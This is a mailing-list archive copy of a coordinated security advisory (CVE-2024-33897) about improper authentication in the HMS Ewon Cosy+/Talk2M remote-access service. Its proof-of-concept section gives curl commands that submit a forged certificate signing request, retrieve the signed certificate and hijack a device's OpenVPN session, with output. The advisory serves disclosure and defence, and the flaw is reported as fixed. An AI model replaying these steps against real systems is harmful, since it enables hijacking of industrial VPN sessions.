---
title: Improper Authentication (CWE-287) CVE-2024-33897
url: https://seclists.org/fulldisclosure/2024/Aug/24
source: Full Disclosure
date: 2024-08-19
fetch_date: 2025-10-06T18:03:39.461719
---

# Improper Authentication (CWE-287) CVE-2024-33897

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](25)

[![Previous](/images/left-icon-16x16.png)](23)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](27)

![](/shared/images/nst-icons.svg#search)

# Improper Authentication (CWE-287) CVE-2024-33897

---

*From*: Moritz Abrell via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Sun, 11 Aug 2024 19:49:16 +0200

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Advisory ID:               SYSS-2024-043
Product:                   Ewon Cosy+ / Talk2M Remote Access Solution
Manufacturer:              HMS Industrial Networks AB
Affected Version(s):       N.A.
Tested Version(s):         N.A.
Vulnerability Type:        Improper Authentication (CWE-287)
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2024-04-17
Solution Date:             2024-04-18
Public Disclosure:         2024-08-11
CVE Reference:             CVE-2024-33897
Author of Advisory:        Moritz Abrell, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The Ewon Cosy+ is a VPN gateway used for remote access and maintenance
in industrial environments.

The manufacturer describes the product as follows (see [1]):

"The Ewon Cosy+ gateway establishes a secure VPN connection between
the machine (PLC, HMI, or other devices) and the remote engineer.
The connection happens through Talk2m, a highly secured industrial
cloud service. The Ewon Cosy+ makes industrial remote access easy
and secure like never before!"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

During account assignment in the Talk2M platform, a Cosy+ device
generates and sends a certificate signing request (CSR) to the back end.
This CSR is then signed by the manufacturer and used for OpenVPN
authentication by the device afterward.

Since the common name (CN) of the certificate is specified by the device
and used in order to assign the OpenVPN session to the corresponding
Talk2M account, an attacker with root access to a Cosy+ device is able
to manipulate the CSR and get correctly signed certificates for foreign
devices.

Using these certificates for OpenVPN authentication results in hijacking
the VPN session and allows for further attacks, e.g.:

- - Impacting the accessibility of the original device
- - Attacking the Talk2M-connected user device via the VPN connection
- - Eavesdropping and manipulating the network communication of connected
  users

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

Note: Since the X.509 client certificate of a Cosy+, which is used for
      authentication against the Talk2M API, is handled by the hardware
      security module (HSM), root access to a Cosy+ device is required.

1. Exporting the OpenSSL engine to use the hardware security module:
```

 $ export OPENSSL\_CONF=/etc/ssl/se050\_openssl.cnf

```
   $ export EX_SSS_BOOT_SSS_PORT=/dev/i2c-0

2. Sending a self-created CSR to the Talk2M API:
```

 $ curl --path-as-is -i -s -k -X $'POST' \

```
    -H $'Host: eu.device.talk2m.com' -H $'Accept: application/json' \
    -H $'Content-Type: application/json' -H $'Ewon-Serial: 2403-0999-25' \
    -H $'Device-State: AccountLinked' -H $'Content-Length: 768' \
    --data-binary $'{\x0a\x09\"csr\":
        \x09\"-----BEGIN CERTIFICATE REQUEST-----\\nMIIB6zCCAUwCAQAwgaY
        xCzAJBgNVBAYTAkJFMRcwFQYDVQQIEw5CcmFiYW50IFdh\\nbGxvbjERMA8GA1U
        EBxMITml2ZWxsZXMxIzAhBgNVBAoTGkhNUyBJbmR1c3RyaWFs\\nIE5ldHdvcmt
        zIFNBMRAwDgYDVQQLEwdFd29uIEJVMRYwFAYDVQQDEw1EMjMwNy0w\\nMTAxLTI
        1MRwwGgYJKoZIhvcNAQkBFg1pbmZvQGV3b24uYml6MIGbMBAGByqGSM49\\nAgE
        GBSuBBAAjA4GGAAQBaUGPo1FIjOOqyd1M47M2fcLQ2MN3aj7wI8pBYmopdSEY\\
        nKszktBPre3AZ74E4326+vUej6nBG/17SWNb+VZPEyXYBAvEyyvsXfy/UlnB6NX
        aj\\n6rrmy2pqP5bKN/1yR3reqlA6+9rdYzcH3ESJvp9hTkZnV4qbdNjTtqSfZO
        4zu1Zn\\nE+CgADAKBggqhkjOPQQDAgOBjAAwgYgCQgDVbJN5MJJZnkRRvNwwXu
        6GrvILBN6H\\nxTwR3inwMxLf+a/o+SFiqq5Pvsm2UXebVSD3osopdnJ8cxzTzi
        PopsLiXAJCAa5K\\n+0T0H8VAvBzKTQkpiHHzW9JkDvIDaJA4WtYzA+KT7jo4kW
        vQIr7rBBOlILoofQzv\\nypCqHaugjHhdeuJecIiq\\n-----END CERTIFICAT
        E REQUEST-----\\n\"\x0a}' \
    $'https://eu.device.talk2m.com/certificates/csr'; \
    --cert /tmp/birth_key_crt.pem --key /tmp/birth_key_ref.pem

3. Requesting the signed certificate:
```

 $ curl -i -k -H $'Device-State: AccountLinked' \

```
    https://device.talk2m.com/certificates/deviceCertificate  \
    --cert birth_key_crt.pem --key birth_key_ref.pem

4. Talk2M response:
```

 HTTP/1.1 200

```
    date: Tue, 16 Apr 2024 13:09:57 GMT
    server: Apache
    ewon-server-time: 1713272998
    device-state: VpnProvisioned
    content-type: application/json
    transfer-encoding: chunked
```

 {"certificate":"-----BEGIN CERTIFICATE-----\nMIIDTjCCAjagAwIBA[...]

```
    KsxyR8w==\n-----END CERTIFICATE-----"}

5. This signed certificate and the used key can be used for OpenVPN
   authentication. The CN will be used to assign the session to the
   corresponding Talk2M account. This also overwrites a potential
   current VPN session of the original device:

    $ openvpn --config attacker.ovpn
      Attempting to establish TCP connection with [AF_INET]51.195.79.69:443
      TCP connection established with [AF_INET]51.195.79.69:443
      TCPv4_CLIENT link remote: [AF_INET]51.195.79.69:443
      VERIFY OK: depth=1, C=BE, ST=Brabant Wallon, L=Nivelles, O=eWON sa,
        OU=Talk2M, CN=Talk2M Certification Authority,
        emailAddress=itmanager () talk2m com
      VERIFY KU OK
      Validating certificate extended key usage
      ++ Certificate has EKU (str) TLS Web Server Authentication,
        expects TLS Web Server Authentication
      VERIFY EKU OK
      VERIFY OK: depth=0, C=BE, ST=Brabant Wallon, L=Nivelles,
        O=HMS Industrial Networks SA, OU=Talk2M, CN=server-device,
        emailAddress=info () ewon biz
      Control Channel: TLSv1.2, cipher TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384,
        peer certificate: 2048 bit RSA, signature: RSA-SHA1
      [server-device] Peer Connection Initiated with [AF_INET]51.195.79.69:443
      TUN/TAP device tap0 opened
      net_addr_ll_set: lladdr 00:03:27:d8:68:84 for tap0
      TUN/TAP link layer address set to 00:03:27:d8:68:84
      net_iface_mtu_set: mtu 1500 for tap0
      net_iface_up: set tap0 up
      net_addr_v4_add: 10.37.211.214/16 dev tap0
      Data Channel: cipher 'AES-256-GCM', peer-id: 0, compression: 'lzo'
      Timers: ping 10, ping-exit 40
      Initialization Sequence Completed

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

The vulnerability was fixed in the back end by HMS on April 18, 2024.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2024-04-09: Potential vulnerability discovered
2024-04-16: Call with the manufacturer and requested a Talk2M account
            with an assigned device to verify the potential vulnerability
2024-04-16: Manufacturer provided a Talk2M account with an assigned device
2024-04-16: Vulnerability confirmed
2024-04-16: Short update about the state sent to the manufacturer
2024-04-16: Security advisory inculding technical details provided to
            the manufacturer
2024-04-18: Vulnerability fixed by the manufacturer
2024-04-30: CVE ID CVE-2024-33897[5] assigned by the ma...